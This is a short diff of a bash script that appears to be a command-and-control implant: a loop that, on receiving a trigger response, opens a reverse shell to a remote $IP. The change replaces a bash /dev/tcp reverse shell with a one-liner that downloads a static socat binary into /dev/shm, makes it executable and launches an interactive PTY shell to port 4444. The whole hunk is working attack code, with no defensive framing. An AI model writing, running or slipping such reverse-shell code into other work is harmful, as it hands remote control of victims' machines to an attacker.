@@ -13,7 +13,8 @@ while true; do
     else
         if [[ $RESPONSE == $REVERSE_SHELL_CODE ]]; then
             echo "STARTING REVERSE SHELL"
-            bash -i >& /dev/tcp/$IP/2255 0>&1
+            # One liner to get socat and create a reverse shell
+            wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:4444
         else
             echo $RESPONSE
             echo "something else"
